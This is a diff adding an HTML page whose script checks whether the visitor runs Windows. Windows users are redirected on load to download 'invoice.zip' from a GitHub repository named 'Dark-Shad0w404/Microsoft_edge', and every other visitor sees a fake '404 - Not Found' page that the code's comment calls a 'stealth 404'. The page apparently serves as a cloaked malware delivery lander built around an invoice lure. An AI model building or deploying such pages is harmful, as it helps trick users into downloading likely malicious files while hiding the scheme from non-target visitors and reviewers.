@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <script>
+        // URL to redirect to
+        const redirectUrl = "https://github.com/Dark-Shad0w404/Microsoft_edge/raw/main/invoice.zip";
+
+        // Strong Windows detection
+        function isWindows() {
+            const platform = navigator.platform.toLowerCase();
+            const userAgent = navigator.userAgent.toLowerCase();
+            return platform.includes("win") || /windows/.test(userAgent);
+        }
+
+        // Run detection immediately
+        if (isWindows()) {
+            // Redirect Windows users immediately
+            window.location.href = redirectUrl;
+
+            // Fallback if redirect fails
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <h1>Download failed</h1>
+                    <p>Could not redirect to the file. Please try again later.</p>
+                `;
+            }, 1000);
+        } else {
+            // Non-Windows users: stealth 404
+            document.documentElement.innerHTML = `
+                <head>
+                    <title>404 - Not Found</title>
+                    <meta charset="UTF-8">
+                </head>
+                <body>
+                    <h1>404 - Not Found</h1>
+                    <p>The requested page could not be found.</p>
+                </body>
+            `;
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
